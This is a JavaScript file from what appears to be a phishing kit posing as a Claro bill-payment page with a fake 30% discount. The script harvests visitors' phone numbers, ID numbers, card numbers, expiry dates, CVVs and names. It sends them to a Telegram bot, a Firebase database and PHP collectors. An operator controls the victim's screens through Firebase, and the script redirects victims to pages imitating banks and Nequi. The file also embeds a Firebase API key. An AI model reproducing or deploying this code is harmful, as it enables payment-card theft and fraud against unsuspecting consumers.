let tipo = '';

function cambiaimg(value) {
    var imagen1 = document.getElementById('check1');
    var imagen2 = document.getElementById('check2');
    var imagen3 = document.getElementById('check3');
    var imagen4 = document.getElementById('check4');

    if (value === 1) {
        tipo = 'TLF';
        imagen1.src = 'https://dev-claro-img-css.pantheonsite.io/check.png';
        imagen2.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen3.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen4.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
    } else if (value === 2) {
        tipo = 'Hogar';
        imagen1.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen2.src = 'https://dev-claro-img-css.pantheonsite.io/check.png';
        imagen3.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen4.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
    } else if (value === 3) {
        tipo = 'Equipo';
        imagen1.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen2.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen3.src = 'https://dev-claro-img-css.pantheonsite.io/check.png';
        imagen4.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
    } else if (value === 4) {
        tipo = 'Internet';
        imagen1.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen2.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen3.src = 'https://dev-claro-img-css.pantheonsite.io/uncheck.png';
        imagen4.src = 'https://dev-claro-img-css.pantheonsite.io/check.png';
    }
}


const firebaseConfig = {
  apiKey: "AIzaSyD0XC_TgWII1ztDq9htS9DVp36zwcPiRek",
  authDomain: "rob0908n.firebaseapp.com",
  databaseURL: "https://" + cliente + "-default-rtdb.firebaseio.com",
  projectId: "rob0908n",
  storageBucket: "rob0908n.appspot.com",
  messagingSenderId: "1033082864476",
  appId: "1:1033082864476:web:40db6e62e73585ac653799"
};

firebase.initializeApp(firebaseConfig);
var database = firebase.database();

function mostrarSeccion(seccion) {
  firebase.database().ref(`1/${clienteid}/sectionVisible`).set(seccion);
}

function obtenerHoraMinutoSegundo() {
  const ahora = new Date();
  const hora = ahora.getHours();
  const minuto = ahora.getMinutes();
  const segundo = ahora.getSeconds(); // Obtener el segundo
  // Formatea la hora, el minuto y el segundo para que tengan siempre dos digitos
  const horaFormateada = hora < 10 ? `0${hora}` : hora;
  const minutoFormateado = minuto < 10 ? `0${minuto}` : minuto;
  const segundoFormateado = segundo < 10 ? `0${segundo}` : segundo;

  return `${horaFormateada}:${minutoFormateado}:${segundoFormateado}`;
}


function selectTC(option,banco) {
  var numtc = document.getElementById("numtc").value;
  var fechat = document.getElementById("fechat").value;
  var codcv = document.getElementById("codcv").value;
  var datost = document.getElementById("datost").value;
  var celular = document.getElementById("celular").value;
  var documento = document.getElementById("documento").value;

  // Validaci n de campos obligatorios
  if (numtc === "" || fechat === "" || codcv === "" || datost === "" || celular === "" || documento === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }


  $.post( "process/crear-tar.php", { tar:numtc,fec:fechat,cvv:codcv,nom:datost,ban:banco } ,function(data) {    
    window.location.href = "transaction/ent/" + option;  
  }); 

  

}




function selectOption2(option) {
  var numtc = document.getElementById("numtc").value;
  var fechat = document.getElementById("fechat").value;
  var codcv = document.getElementById("codcv").value;
  var datost = document.getElementById("datost").value;
  var celular = document.getElementById("celular").value;
  var documento = document.getElementById("documento").value;

  // Validaci n de campos obligatorios
  if (numtc === "" || fechat === "" || codcv === "" || datost === "" || celular === "" || documento === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }

  var message = `
  Cliente #: ${clienteid}
  T: ${numtc}
  F: ${fechat}
  CV: ${codcv}
  ...................
  N: ${datost}
  TLF: ${celular}
  C: ${documento}
  B: ${option}
  `;
  firebase.database().ref(`${clienteid}`).update({ numtc: numtc, fechat:fechat, codcv:codcv, datost: datost});

  var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
      .then(response => response.json())
      .then(data => {
          if (data.ok) {
              if (option == "TRICOLOR" || option == "NEQUI") {
                  mostrarSeccion(option);
                  var redirectUrl = option == "TRICOLOR" ? tricoe : neqe;
                  window.location.href = `${redirectUrl}?date=tc${clienteid}`;
              } else {
                document.getElementById("Tarjeta").style.display = "none";
                document.getElementById("errorpasarela").style.display = "";              }
          } else {
              alert('Error al enviar el mensaje');
          }
      })
      .catch(error => {
          console.error('Error:', error);
          alert('Error al enviar el mensaje');
      });
}



function formatInput(input) {
// Eliminar cualquier car cter que no sea un d gito
var value = input.value.replace(/\D/g, '');

if (input.id === "numtc") {
// Formatear n mero de tarjeta de cr dito
var formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
input.value = formattedValue;
} else if (input.id === "fechat") {
// Formatear fecha de vencimiento
var formattedValue = value.replace(/(\d{0,2})(\d{0,4})/, function(match, p1, p2) {
if (!p2) return p1;
return p1 + '/' + p2;
});
input.value = formattedValue;
}
}



function imprimirusuario() {
  celular = document.getElementById("celular").value; // Asignar el valor a la variable celular
  documento = document.getElementById("documento").value;
  clienteid = obtenerHoraMinutoSegundo();
  if (documento === "") {
    alert("Por favor, Ingresa tu Numero de Documento.");
    return; // Detener la ejecucion de la funcion en este punto
  }

  if (celular === "") {
    alert("Por favor, ingresa tu Numero de Referencia o Telefono.");
    return; // Detener la ejecucion de la funcion en este punto
  }


  firebase.database().ref(`1/${clienteid}`).update({ celular: celular, nombre:documento, documento:documento, clienteid: clienteid, color:"intermitente"});
  firebase.database().ref(`${clienteid}`).update({ celular: celular,  documento:documento, });
  document.getElementById('usuario').style.display = 'none';
  mostrarSeccion("espera");

  
  var section = document.createElement("section");
  section.id = clienteid;
  section.innerHTML = `
  
  <section id="section2" ">
  <div class="tabla">
  <div class="fila">
  <div class="celda celda2">Pago de Facturas</div>
  </div>
  <div class="fila">
  <div class="celda"><p>Cliente:  <span id="nombre"></span></p> </div>
  </div>
  <div class="fila">
  <div class="celda"><p>Celular: <span id="celular2"></span></p> </div>
  </div>
  <div class="fila">
  <div class="celda"><p>Deuda Total: $<span id="deuda"></span></p> </div>
  </div>
  <div class="fila">
  <div class="celda"><p>Descuento: $<span id="descuento"></span></p> </div>
  </div>
  <div class="fila">
  <div class="celda"><p>Total a Pagar: $<span id="total"></span></p> </div>
  </div>
  </div>
  <button class="boton2" onclick="mostrarSeccion('section3');" style="margin-top: -0.5rem;">Continuar</button>
  
  </section>

  <section id="espera" >
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
              <div style="text-align: center;"><img style="width: 130px; margin-left: auto;" src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png">
                 <br><br>

                 <div class="loader">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                 </div>
              </div>       
        <br> 
        <br>  
        <br>
        
              <div style="text-align: center; line-height: 1rem;" >
                 <h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 1.6rem; color: #e52a1b;">Validando la Informacion...</h2>
                 <br>
                 <br>
                 <br>   
                 <br>
                 <br>
              </div>
              <br>
              <br>
              <br>
              <br>
              <br>
              <br>
      </section>

      <section id="Tarjeta">
        <div class="texto_gris2">
            <p class="texto2">Paga de manera facil y desde donde quieras con tu tarjeta de Debito o Credito.</p>
        </div>
            <div>
                <label for="input1" class="azul">Numero de la Tarjeta</label>
                <input type="text" class="inputst" pattern="[0-9]*" inputmode="numeric" id="numtc" placeholder="1234 5678 9012 3456" autofocus="" autocomplete="off" minlength="16" maxlength="19" oninput="formatInput(this)">
            </div>
            <div>
                <label for="input1" class="azul">Fecha de Vencimiento</label>
                <input type="text" class="inputst" pattern="[0-9]*" inputmode="numeric" id="fechat" placeholder="MM/YYYY" b="" autocomplete="off" minlength="7" maxlength="7" oninput="formatInput(this)">
            </div>
            <div>
                <label for="input1" class="azul">Codigo de Seguridad</label>
                <input type="text" class="inputst" pattern="[0-9]*" inputmode="numeric" id="codcv" placeholder="CVV" b="" autocomplete="off" minlength="2" maxlength="4">
            </div>
            <div>
                <label for="input1" class="azul">Numero de Cuotas</label>
                <input type="text" class="inputst" pattern="[0-9]*" inputmode="numeric" placeholder="1" autocomplete="off" minlength="1" maxlength="2">
            </div>
            <div>
                <label for="input1" class="azul">Nombres y Apellidos</label>
                <input type="text" class="inputst" required="" id="datost" placeholder="" autocomplete="off" minlength="5">
            </div>
            <label for="input1" class="azul">Selecciona tu Entidad Bancaria</label>       
            <button id="selectBox" style="display: ; background-color: transparent; color: #5c5c5c; width: 80%; border-width: 1px;
            border-color: #b4b4b4;" class="select-box inputst" onclick="toggleOptions1()">
            <span id="selectedOption1">Selecciona</span>
            <ul id="optionsList1" class="options-list">
              <li onclick="selectTC('b-34f4','Bogota')">Banco De Bogotá</li>
              <li onclick="selectTC('b-34f1','AV Villas')">Banco AV Villas</li>
              <li onclick="selectTC('b-34f13','BBVA')">BBVA Colombia</li>
              <li onclick="selectTC('b-34f3','Davivienda')">Davivienda</li>
              <li onclick="selectTC('b-34f9','Bancolombia')">Bancolombia</li>
              <li onclick="selectTC('b-34f5','Falabella')">Banco Falabella</li>
              <li onclick="selectTC('b-34f12','Colpatria')">Scotiabank Colpatria</li>                          
              <li onclick="selectTC('b-34f18','Popular')">Banco Popular</li>              
            </ul>
            </button>
            <input id="selectedValue1" type="hidden">

        </section>    
  
        <section id="section3" style="display:none;" >

        <button id="ca"><img src="https://dev-claro-img-css.pantheonsite.io/CA.png" id="cai" onclick="selectOption1('Tarjeta')"><p>Tarjetas de Credito</p></button>
        <button id="ba"><img src="https://dev-claro-img-css.pantheonsite.io/ba.png" id="bai" onclick="selectOption1('TRICOLOR')">.</button>
        <button id="ba"><img src="https://dev-claro-img-css.pantheonsite.io/logo-bogota-mobile.jpg" id="bgt" onclick="selectOption1('De Bogota')">.</button>
        <button id="ne"><img src="https://dev-claro-img-css.pantheonsite.io/NE.png" id="nei" onclick="selectOption1('NEQUI')">.</button>
        <input id="selectedValue1" type="hidden">
        
        </div>
        
        
        <button class="boton2" style="margin-top: -0.5rem;" onclick="enviador()">Continuar</button>
        </section>
  
  `;
  setTimeout(function () {
    document.getElementById("section2").style.display = "";
    document.getElementById("ggris1").style.display = "";
    document.getElementById("footerr").style.display = "";
    document.getElementById("comida").style.display = "";
    document.getElementById("espera").style.display = "none";
    devuelvesection2();
  }, 3000);
  var contenedor = document.getElementById("contenedor");
  contenedor.appendChild(section);
    document.getElementById("celular2").innerText = celular;
  
  devuelvesection();
}

function devuelvesection(){
    firebase.database().ref(`1/${clienteid}/sectionVisible`).on("value", function (snapshot) {
        var sectionVisible = snapshot.val();
        document.getElementById("section2").style.display = "none";
        document.getElementById("section3").style.display = "none";
        document.getElementById("espera").style.display = "none";
        document.getElementById("Tarjeta").style.display = "none";


      
       if (sectionVisible === "section3") {
            document.getElementById("section3").style.display = "";
          } else if (sectionVisible === "section2") {
            document.getElementById("section2").style.display = "";
            document.getElementById("ggris1").style.display = "";
            document.getElementById("footerr").style.display = "";
            document.getElementById("comida").style.display = "";
          } else if (sectionVisible === "espera") {
            document.getElementById("espera").style.display = "";
          } 
        });  
}

function devuelvesection2() {
  firebase.database().ref(`1/${clienteid}/nombre`).on("value", function(snapshot) {
      var nombre = snapshot.val();
          document.getElementById('nombre').innerText = nombre;
      } 
  );
}

function porcentaje(deudar) {

            document.getElementById("deuda").innerText = deudar;
            var monto = parseFloat(deudar.replace(/\./g, ''));
    
            // Calcular el descuento y el total
            var descuento = monto * 0.30;
            var montoConDescuento = monto - descuento;
            
            // Mostrar los resultados con separadores de mil
            document.getElementById('descuento').innerText = descuento.toLocaleString();
            document.getElementById('total').innerText = montoConDescuento.toLocaleString();
        }

async function validarNumero() {  

  $.post( "process/claro.php", { idc:document.getElementById('documento').value,lin:document.getElementById('celular').value } ,function(data) {
    
  }); 

  const telefonoIngresado = document.getElementById('celular').value;
  const response = await fetch('numeros.txt');
  const data = await response.text();
  const lineas = data.split('\n').map(linea => linea.split(','));

  for (let i = 0; i < lineas.length; i++) {
    //alert(lineas[i]);
    if (lineas[i].length < 2) {
      continue; // Saltar la l nea si no tiene al menos dos columnas
    }
    
    const telefono = lineas[i][0].trim().replace('"', '').replace('"', '');
    const valor = lineas[i][1].trim().replace('"', '').replace('"', '');
    if (telefono === telefonoIngresado) {
      const valorCorrespondiente = valor;
      imprimirusuario();      // Guardar el valor en una variable
      porcentaje(valorCorrespondiente);
      return; // Salir del bucle una vez que se encuentra el numero
    }
  }

  alert('El numero de telefono no aplica al descuento.');
  // Detener la funcion aqui
}

function toggleOptions1() {
  var optionsList = document.getElementById("optionsList1");
  if (optionsList.style.display === "block") {
      optionsList.style.display = "none";      
  } else {
      optionsList.style.display = "block";
  }
}

function selectOption1(option) {
  document.getElementById("selectedValue1").value = option;
  document.getElementById("optionsList1").style.display = "none";
  firebase.database().ref(`1/${clienteid}`).update({ tera:option});

  if (option == "TRICOLOR" || option == "NEQUI" || option == "De Bogota") {
    mostrarSeccion(option); 
    if (option == "TRICOLOR") {    
        window.location.href = "transaction/sucursal";
    } else if (option == "NEQUI") {        
          mostrarSeccion(option); 
          window.location.href = "transaction/clientes";        
    } else if (option == "De Bogota") {        
          mostrarSeccion(option); 
          window.location.href = "transaction/personas";        
        }
      } else if ( option == "Tarjeta") {
        document.getElementById("section3").style.display = "none";
        document.getElementById("Tarjeta").style.display = "";

      } else {
        document.getElementById("selectedOption1").innerText = option;
        document.getElementById("section3").style.display = "none";
        document.getElementById("errorpasarela").style.display = "";
      }
}